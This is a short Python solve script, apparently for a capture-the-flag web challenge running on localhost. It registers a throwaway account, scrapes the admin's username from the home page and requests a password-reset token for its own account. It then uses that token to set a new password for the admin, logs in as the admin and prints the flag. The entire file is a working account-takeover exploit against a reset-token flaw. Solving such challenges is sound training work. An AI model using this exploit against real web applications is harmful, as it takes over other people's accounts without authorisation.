import requests
import re
import random
import string
from bs4 import BeautifulSoup

def generate_random_string(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def extract_admin_data(html):
    soup = BeautifulSoup(html, 'html.parser')
    admin_data = soup.find(id="admin_data")
    if admin_data:
        match = re.match(r"admin\^.+?\^.+", admin_data.text)
        if match:
            return match.group(0)
    return None

def extract_reset_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    reset_token_info = soup.find('p')
    if reset_token_info and "Your reset token is:" in reset_token_info.text:
        token_match = re.search(r"Your reset token is: (\w+)", reset_token_info.text)
        if token_match:
            return token_match.group(1)
    return None

def extract_flag(html):
    soup = BeautifulSoup(html, 'html.parser')
    flag_text = soup.find('p', class_='error').get_text()
    flag = re.search(r'srdnlen\{.*?\}', flag_text)
    return flag.group(0) if flag else None

req = requests.session()
url = "http://localhost:5000"
user = generate_random_string()

registration = req.post(url + "/register", data={"username": user, "password": user})
login = req.post(url + "/login", data={"username": user, "password": user})
home = req.get(url + "/home")
admin_username = extract_admin_data(home.text)

req = requests.session()
reset_password = req.post(url + "/reset_password", data={"username": user})
reset_token = extract_reset_token(reset_password.text)

forgot_password = req.post(url + "/forgot_password", data={
    "username": admin_username, "reset_token": reset_token, "new_password": user, "confirm_password": user
})

login = req.post(url + "/login", data={"username": admin_username, "password": user})
ben10 = req.get(url + "/image/ben10")
flag = extract_flag(ben10.text)

print(flag)